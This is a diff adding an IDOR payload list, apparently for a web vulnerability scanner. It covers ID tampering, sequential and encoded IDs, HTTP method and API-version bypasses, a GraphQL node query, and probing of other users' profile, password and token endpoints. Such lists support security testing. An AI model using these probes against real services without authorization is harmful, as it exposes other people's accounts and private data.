@@ -1,0 +1,55 @@
+# IDOR Payloads — cyberm4fia-scanner
+# Categories: ID Manipulation, Method Variation, Version Downgrade
+
+# ─── ID Manipulation ───
+id=1
+id=0
+id=-1
+id=null
+id=admin
+id=root
+id=test
+id=11111111-1111-1111-1111-111111111111
+id=00000000-0000-0000-0000-000000000000
+
+# ─── Sequential ID probing ───
+user_id=100 → user_id=101
+user_id=100 → user_id=99
+user_id=100 → user_id=0
+user_id=100 → user_id=1
+
+# ─── GraphQL IDOR ───
+{ node(id: "base64_encoded_id") { ... on User { email } } }
+
+# ─── Method Variation Bypass ───
+GET /api/resource/123 → 403
+PUT /api/resource/123 → 200 (method not checked)
+DELETE /api/resource/123 → 200
+PATCH /api/resource/123 → 200
+POST /api/resource/123 → 200
+
+# ─── Parameter Name Variation ───
+/api/users/YOUR_ID → /api/users/OTHER_ID
+/api/users?uid=YOUR_ID → /api/users?uid=OTHER_ID
+/api/users?user_id=YOUR_ID → /api/users?user_id=OTHER_ID
+/api/users?account_id=YOUR_ID → /api/users?account_id=OTHER_ID
+/api/users?profile_id=YOUR_ID → /api/users?profile_id=OTHER_ID
+/api/users?customer_id=YOUR_ID → /api/users?customer_id=OTHER_ID
+/api/users?entity_id=YOUR_ID → /api/users?entity_id=OTHER_ID
+
+# ─── Version Downgrade ───
+/api/v2/resource/123 → 403 (has auth)
+/api/v1/resource/123 → 200 (old version missing auth)
+/api/resource/123 → 200 (unversioned missing auth)
+
+# ─── ID Encoding Variations ───
+user_id=100 → user_id=MTAw (base64)
+user_id=100 → user_id=d64 (hex)
+user_id=100 → user_id=144 (octal)
+
+# ─── Sibling Endpoint Testing ───
+/api/users/123/profile → /api/users/456/profile
+/api/users/123/email → /api/users/456/email
+/api/users/123/password → /api/users/456/password
+/api/users/123/settings → /api/users/456/settings
+/api/users/123/tokens → /api/users/456/tokens
